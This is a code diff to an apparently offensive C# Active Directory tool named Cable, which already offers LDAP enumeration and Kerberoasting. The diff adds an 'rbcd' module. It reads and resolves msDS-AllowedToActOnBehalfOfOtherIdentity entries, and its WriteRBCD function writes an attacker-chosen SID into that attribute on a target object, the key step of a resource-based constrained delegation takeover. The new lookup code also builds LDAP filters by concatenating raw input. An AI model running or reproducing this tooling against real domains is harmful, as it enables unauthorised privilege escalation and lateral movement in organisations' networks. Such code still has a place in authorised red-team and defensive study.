@@ -4,6 +4,9 @@ using System.DirectoryServices;
 using Asn1;
 using System.DirectoryServices.ActiveDirectory;
 using System.Security.Principal;
+using System.Security.AccessControl;
+using System.Net;
+using System.Security.Cryptography;
 
 namespace Cable
 {
@@ -13,12 +16,12 @@ namespace Cable
         static void Help(string help)
         {
             string modhelptext =
-
                 "Cable.exe [Module]\n" +
                 "Modules:\n" +
                 "\tenum [options] - Enumerate LDAP\n" +
                 "\tkerberoast [account] - Kerberoast a potentially supplied account, or everything\n" +
-                "\tdclist - List Domain Controllers in the current Domain\n";
+                "\tdclist - List Domain Controllers in the current Domain\n" +
+                "\trbcd - Write or read the msDs-AllowedToActOnBehalfOfOtherIdentity attribute\n";
 
             string enumhelptext =
                 "Options:\n" +
@@ -31,6 +34,12 @@ namespace Cable
                 "\t--unconstrained - Enumerate accounts with the TRUSTED_FOR_DELEGATION flag set\n" +
                 "\t--rbcd - Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set";
 
+            string rbcdhelptext =
+                "Options:\n" +
+                "\t--delegate-to <account> - Target account to delegate access to\n" +
+                "\t--delegate-from <account> - Controller account to delegate from\n" +
+                "\t--write - Operation\n";
+
             switch (help)
             {
                 case "mod":
@@ -39,8 +48,52 @@ namespace Cable
                 case "enum":
                     Console.WriteLine(enumhelptext);
                     break;
+                case "rbcd":
+                    Console.WriteLine(rbcdhelptext);
+                    break;
             }
 
+        }
+
+        static string sidToAccountLookup(string sid)
+        {
+            SearchResultCollection results;
+
+            DirectoryEntry de = new DirectoryEntry();
+            DirectorySearcher ds = new DirectorySearcher(de);
+
+            string query = "(objectSid=" + sid + ")";
+            ds.Filter = query;
+            results = ds.FindAll();
+            string account = null;
+
+            foreach (SearchResult sr in results)
+            {
+                account = sr.Properties["samaccountname"][0].ToString();
+            }
+
+            return account;
+        }
+
+        static string accountToSidLookup(string account)
+        {
+            SearchResultCollection results;
+
+            DirectoryEntry de = new DirectoryEntry();
+            DirectorySearcher ds = new DirectorySearcher(de);
+
+            string query = "(samaccountname=" + account + ")";
+            ds.Filter = query;
+            results = ds.FindAll();
+            string accountSid = null;
+
+            foreach (SearchResult sr in results)
+            {
+                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
+                accountSid = sid.Value;
+            }
+
+            return accountSid;
         }
 
         static void Enum(string type, string[] args)
@@ -74,7 +127,6 @@ namespace Cable
                 }
             }
             ds.Filter = query;
-
             results = ds.FindAll();
 
             if (results.Count == 0)
@@ -103,13 +155,51 @@ namespace Cable
                 }
                 if (rbcdInObject)
                 {
-                    Console.WriteLine("msDs-AllowedToActOnBehalfOfOtherIdentity: " + sr.Properties["msds-allowedtoactonbehalfofotheridentity"][0].ToString());
+                    Console.Write("msDs-AllowedToActOnBehalfOfOtherIdentity: ");
+                    RawSecurityDescriptor rsd = new RawSecurityDescriptor((byte[])sr.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"][0], 0);
+                    foreach (CommonAce ace in rsd.DiscretionaryAcl)
+                    {
+                        Console.WriteLine(sidToAccountLookup(ace.SecurityIdentifier.ToString()));
+                    }
+                                        
                 }
-
 
             }
 
         }
+
+        static void WriteRBCD(string delegate_to, string delegate_from)
+        {
+            RawSecurityDescriptor rd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + accountToSidLookup(delegate_from) + ")");
+            Byte[] bDescriptor = new byte[rd.BinaryLength];
+            rd.GetBinaryForm(bDescriptor, 0);
+
+            SearchResultCollection results;
+
+            DirectoryEntry de = new DirectoryEntry();
+            DirectorySearcher ds = new DirectorySearcher(de);
+
+            string query = "(samaccountname=" + delegate_to + ")";
+            ds.Filter = query;
+            results = ds.FindAll();
+
+            foreach (SearchResult sr in results)
+            {
+                DirectoryEntry mde = sr.GetDirectoryEntry();
+                if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
+                {
+                    Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity attribute set..");
+                    return;
+                }
+                else
+                {
+                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Add(bDescriptor);
+                    mde.CommitChanges();
+                    Console.WriteLine("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity");
+                }
+            }
+        }
+        
         static void dclist()
         {
             Domain domain = Domain.GetCurrentDomain();
@@ -131,7 +221,6 @@ namespace Cable
             DirectoryEntry de = new DirectoryEntry();
             ds = new DirectorySearcher(de);
             ds.Filter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
-
 
             Console.WriteLine("[+] Finding Kerberoastable accounts...");
             results = ds.FindAll();
@@ -237,6 +326,41 @@ namespace Cable
                             Kerberoast(spns);
                         }
 
+                    }
+
+                    else if (args[0] == "rbcd")
+                    {
+                        string delegate_from = "";
+                        string delegate_to = "";
+                        string operation = "";
+
+                        for (int i = 0; i < args.Length; i++)
+                        {
+                            switch (args[i])
+                            {
+                                case "--delegate-to":
+                                    delegate_to = args[i + 1];
+                                    break;
+                                case "--delegate-from":
+                                    delegate_from = args[i + 1];
+                                    break;
+                                case "--write":
+                                    operation = "write";
+                                    break;
+                            }
+                        }
+
+                        if(delegate_from == "" || delegate_to == "" || operation == "")
+                        {
+                            Console.WriteLine("[-] You must specify all the parameters required for RBCD operations");
+                            Help("rbcd");
+                        }
+
+                        if (operation == "write")
+                        {
+                            WriteRBCD(delegate_to, delegate_from);
+                        }
+                        
                     }
 
                     else if (args[0] == "enum")
